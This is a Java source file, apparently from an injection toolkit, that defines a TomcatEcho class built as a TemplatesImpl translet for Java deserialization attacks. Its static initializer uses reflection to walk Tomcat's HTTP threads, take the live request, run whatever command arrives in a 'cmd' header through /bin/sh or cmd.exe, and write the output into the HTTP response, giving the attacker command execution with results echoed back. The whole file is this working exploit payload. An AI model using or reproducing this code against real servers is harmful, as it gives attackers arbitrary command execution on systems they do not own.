package net.roboterh.injector.templates;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.connector.Response;
import org.apache.coyote.Request;
import org.apache.coyote.RequestInfo;

import java.io.InputStream;
import java.io.Writer;
import java.lang.reflect.Field;
import java.util.List;
import java.util.Scanner;

public class TomcatEcho extends AbstractTranslet {

    static {
        try {
            String cmdHeader = "cmd";

            boolean flag = false;
            Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(),"threads");
            for (int i=0;i<threads.length;i++){
                Thread thread = threads[i];
                if (thread != null){
                    String threadName = thread.getName();
                    if (!threadName.contains("exec") && threadName.contains("http")){
                        Object target = getField(thread,"target");
                        Object global = null;
                        if (target instanceof Runnable){
                            // 需要遍历其中的 this$0/handler/global
                            // 需要进行异常捕获，因为存在找不到的情况
                            try {
                                global = getField(getField(getField(target,"this$0"),"handler"),"global");
                            } catch (NoSuchFieldException fieldException){
                                fieldException.printStackTrace();
                            }
                        }
                        // 如果成功找到了 我们的 global ，我们就从里面获取我们的 processors
                        if (global != null){
                            List processors = (List) getField(global,"processors");
                            for (i=0;i<processors.size();i++){
                                RequestInfo requestInfo = (RequestInfo) processors.get(i);
                                if (requestInfo != null){
                                    Request tempRequest = (Request) getField(requestInfo,"req");
                                    org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1);
                                    Response response = request.getResponse();

                                    String cmd = null;
                                    if (request.getHeader(cmdHeader) != null){
                                        cmd =  request.getHeader(cmdHeader);
                                    }

                                    if (cmd != null){
//                                        System.out.println(cmd);
                                        boolean isLinux = true;
                                        String osType = System.getProperty("os.name");
                                        if (osType != null && osType.toLowerCase().contains("win")) {
                                            isLinux = false;
                                        }
                                        String[] cmds = isLinux ? new String[]{"/bin/sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                                        InputStream inputStream = Runtime.getRuntime().exec(cmds).getInputStream();
                                        Scanner s = new Scanner(inputStream).useDelimiter("\\a");
                                        String output = s.hasNext() ? s.next() : "";

                                        Writer writer = response.getWriter();
                                        writer.write(output);
                                        writer.flush();
                                        inputStream.close();
//                                        System.out.println("success");
                                        flag = true;
                                        break;
                                    }
                                    if (flag){
                                        break;
                                    }
                                }
                            }
                        }
                    }
                }
                if (flag){
                    break;
                }
            }
        } catch (Exception e){
            e.printStackTrace();
        }

    }

    public static Object getField(Object obj,String fieldName) throws Exception{
        Field f0 = null;
        Class clas = obj.getClass();

        while (clas != Object.class){
            try {
                f0 = clas.getDeclaredField(fieldName);
                break;
            } catch (NoSuchFieldException e){
                clas = clas.getSuperclass();
            }
        }

        if (f0 != null){
            f0.setAccessible(true);
            return f0.get(obj);
        }else {
            throw new NoSuchFieldException(fieldName);
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
